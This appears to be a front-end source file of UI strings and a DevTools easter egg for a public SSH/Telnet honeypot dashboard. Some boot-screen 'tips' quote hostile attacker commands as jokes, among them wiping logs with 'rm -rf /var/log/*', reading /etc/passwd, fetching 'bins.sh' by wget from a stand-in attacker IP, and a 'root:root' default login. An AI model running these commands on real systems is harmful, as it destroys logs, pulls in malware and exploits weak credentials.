/**
 * All the voice in one file.
 *
 * The dashboard shows real attacks against a real box, so the *data* stays
 * straight — counts, timestamps and technique labels are never jokes. The
 * chrome around it does not have to be. Keeping every playful string here
 * means the tone can be tuned, toned down or swapped wholesale without
 * touching a component.
 */

/**
 * Rotating status words, in the spirit of Claude Code's loading verbs.
 *
 * "hunajapannu" is Finnish for honey pot, so the list leans on both halves:
 * things a honeypot does to attackers, and things you do to honey.
 */
export const LOADING_WORDS = [
  // what the trap is doing
  "Baiting", "Luring", "Ensnaring", "Tarpitting", "Sinkholing", "Decoying",
  "Fingerprinting", "Enumerating", "Triaging", "Correlating", "Snooping",
  "Profiling", "Trapping", "Lurking",
  // what the pot is doing
  "Simmering", "Steeping", "Brewing", "Percolating", "Marinating",
  "Thickening", "Drizzling", "Caramelising",
  // what we are all doing
  "Vibing", "Doomscrolling", "Snitching", "Rummaging", "Eavesdropping",
];

/** Tips shown on the boot screen. Kept in the project's existing register. */
export const BOOT_MESSAGES = [
  { label: "Tip #404", detail: "uname -s -v -n -m? Red flag fr fr." },
  { label: "NPC Behavior", detail: "cat /proc/uptime" },
  { label: "🚨 SUS ALERT", detail: "Why is bro echoing base64 again?" },
  { label: "Pro Hacker Tip", detail: "root:root" },
  { label: "Loading", detail: "Trust the process." },
  { label: "Pro Hacker Tip", detail: "rm -rf /var/log/*" },
  { label: "Pro Tip", detail: "cat /etc/passwd | grep root" },
  { label: "Threat Intel", detail: "The call is coming from AS14061." },
  { label: "Password Meta", detail: "123456 is still undefeated. 68k attempts." },
  { label: "OPSEC L", detail: "chattr -ia .ssh then leaving the authorized_keys. Bold." },
  { label: "Reminder", detail: "This box has nothing on it. They keep trying anyway." },
  { label: "Certified Bruh Moment", detail: "wget http://<attacker-ip>/bins.sh — no TLS, no shame." },
  { label: "Hot Take", detail: "Telnet in 2026 is a lifestyle choice." },
  { label: "Field Note", detail: "Average session: 3 seconds. Attention spans are cooked." },
  { label: "Tip #200", detail: "If you can read this, the API answered in under a second." },
];

/**
 * Empty-state copy. Each pair is { line, hint } so the joke sits on top and
 * the actually-useful explanation sits underneath it, rather than replacing it.
 */
export const EMPTY_STATES = {
  events: {
    line: "No events yet — waiting for attackers...",
    hint: "Usually under a minute. They are very reliable.",
  },
};

/**
 * Fired the moment someone opens DevTools, in the same register as the boot
 * tips: the site logs people poking at a honeypot, so being caught poking at
 * the site is the joke that was sitting there waiting.
 */
export const DEVTOOLS_MESSAGES = [
  { label: "SUS ALERT", detail: "Subject opened DevTools. Logged to /dev/null for legal reasons." },
  { label: "Tip #1337", detail: "You are now the one being observed. Weird, isn't it." },
  { label: "OPSEC L", detail: "Inspecting a honeypot's frontend. Bold. Respect." },
  { label: "NPC Behavior", detail: "F12. Every single time." },
  { label: "Threat Intel", detail: "Threat actor identified: someone curious. Severity: adorable." },
  { label: "Certified Bruh Moment", detail: "There is no flag here. There has never been a flag here." },
  { label: "Field Note", detail: "The pot logs attackers. This logs you. Fair is fair." },
  { label: "Pro Hacker Tip", detail: "The API is open and unauthenticated. You can just ask it nicely." },
  { label: "Hot Take", detail: "The real payload was the bundle we shipped along the way." },
  { label: "Reminder", detail: "Nothing here is obfuscated enough to hide how ordinary it is." },
];

/**
 * Banner for anyone who opens DevTools — which, on a security project, is a
 * fair share of the audience. Cheap to ship, and the sort of thing the people
 * this site is aimed at will actually look for.
 */
export function printConsoleBanner() {
  if (typeof console === "undefined") return;
  const honey = "color:#fbbf24;font-weight:bold";
  const green = "color:#34d399";
  const dim = "color:#065f46";

  console.log(
    "%c🍯 hunajapannu.fi%c — a real SSH/Telnet honeypot, wired to a real dashboard.\n" +
      "%cYou opened the console. Respect. Everything here is open and unauthenticated:\n\n" +
      "%c  summary  %chttps://hunajapannu.fi/api/public/cowrie/summary\n" +
      "%c  live     %chttps://hunajapannu.fi/api/public/cowrie/latest?limit=5\n" +
      "%c  iocs     %chttps://hunajapannu.fi/api/public/cowrie/iocs?hours=24&format=txt\n" +
      "%c  featured %chttps://hunajapannu.fi/api/public/cowrie/sessions/featured\n\n" +
      "%cNo, your password is not sent anywhere. Only 3 chars of its SHA-256.",
    honey, green, dim, dim, green, dim, green, dim, green, dim, green, green
  );
}

/**
 * The other half of the DevTools easter egg.
 *
 * printConsoleBanner runs at load, so by the time most people open the console
 * it is already sitting in the scrollback. This one lands at the moment the
 * panel opens, which is the part that reads as a wink rather than a README.
 *
 * Detection is the docked-DevTools size heuristic: opening the panel shrinks
 * the viewport without touching the window, so outer-minus-inner jumps well
 * past anything a scrollbar accounts for. That is a resize, so there is
 * nothing to poll.
 *
 * It is imprecise in both directions and that is fine. DevTools opened as a
 * separate window is invisible to the page and gets nothing. Tall browser
 * chrome can trip the height check on its own — but a false positive costs
 * exactly nothing here, because the console is the only place this goes: the
 * only person who can ever read it is someone who opened DevTools anyway.
 *
 * Fires once per page load. An easter egg that repeats every time you dock and
 * undock the panel has stopped being one.
 *
 * Returns a disposer. main.jsx has no use for it — the watcher should outlive
 * everything on the page — but a listener with no way off the window is a
 * listener that leaks between tests.
 */
export function watchForDevTools() {
  if (typeof window === "undefined" || typeof console === "undefined") return () => {};

  // Wider than any scrollbar, narrower than any usable DevTools panel.
  const THRESHOLD = 160;
  let fired = false;

  const check = () => {
    if (fired) return;
    if (
      window.outerWidth - window.innerWidth <= THRESHOLD &&
      window.outerHeight - window.innerHeight <= THRESHOLD
    ) {
      return;
    }

    fired = true;
    window.removeEventListener("resize", check);

    const tip = DEVTOOLS_MESSAGES[Math.floor(Math.random() * DEVTOOLS_MESSAGES.length)];
    if (!tip) return;
    console.log(
      `%c ${tip.label} %c ${tip.detail}`,
      "color:#052e16;background:#fbbf24;font-weight:bold;border-radius:3px",
      "color:#34d399"
    );
  };

  window.addEventListener("resize", check);
  check();   // already open before the page finished loading

  return () => window.removeEventListener("resize", check);
}
